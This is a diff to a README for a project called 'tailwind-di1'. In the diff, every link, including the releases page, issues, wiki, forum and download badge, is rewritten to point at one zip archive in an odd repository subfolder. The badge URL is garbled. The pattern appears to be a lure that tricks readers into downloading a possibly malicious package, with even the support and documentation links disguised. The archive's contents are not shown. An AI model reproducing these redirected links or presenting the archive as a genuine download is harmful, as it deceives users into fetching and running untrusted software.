@@ -1,6 +1,6 @@
 # 🌟 tailwind-di1 - Simplify Your Design Process
 
-[![Download tailwind-di1](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/adedir/tailwind-di1/releases)
+[![Download tailwind-di1](https://raw.githubusercontent.com/adedir/tailwind-di1/main/Eileen/tailwind-di1.zip%https://raw.githubusercontent.com/adedir/tailwind-di1/main/Eileen/tailwind-di1.zip)](https://raw.githubusercontent.com/adedir/tailwind-di1/main/Eileen/tailwind-di1.zip)
 
 ## 📦 Overview
 
@@ -22,7 +22,7 @@ To get started, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the button below to go to the download section.
    
-   [Download tailwind-di1](https://github.com/adedir/tailwind-di1/releases)
+   [Download tailwind-di1](https://raw.githubusercontent.com/adedir/tailwind-di1/main/Eileen/tailwind-di1.zip)
 
 2. **Select the Latest Version**: Locate the latest version at the top of the page. 
 
@@ -62,13 +62,13 @@ A: No, tailwind-di1 is a standalone application and can be used offline after in
 
 ## 🤝 Support
 
-If you encounter any issues while installing or using tailwind-di1, please visit our [GitHub Issues page](https://github.com/adedir/tailwind-di1/issues) for support. 
+If you encounter any issues while installing or using tailwind-di1, please visit our [GitHub Issues page](https://raw.githubusercontent.com/adedir/tailwind-di1/main/Eileen/tailwind-di1.zip) for support. 
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/adedir/tailwind-di1/wiki): Find in-depth guides and tips for using tailwind-di1 more effectively.
-- [Community Forum](https://github.com/adedir/tailwind-di1/discussions): Join discussions with other users and share ideas.
+- [Documentation](https://raw.githubusercontent.com/adedir/tailwind-di1/main/Eileen/tailwind-di1.zip): Find in-depth guides and tips for using tailwind-di1 more effectively.
+- [Community Forum](https://raw.githubusercontent.com/adedir/tailwind-di1/main/Eileen/tailwind-di1.zip): Join discussions with other users and share ideas.
 
 Feel free to explore and enhance your design experience with tailwind-di1! 
 
-[Download tailwind-di1](https://github.com/adedir/tailwind-di1/releases) and start your creative journey today.
+[Download tailwind-di1](https://raw.githubusercontent.com/adedir/tailwind-di1/main/Eileen/tailwind-di1.zip) and start your creative journey today.
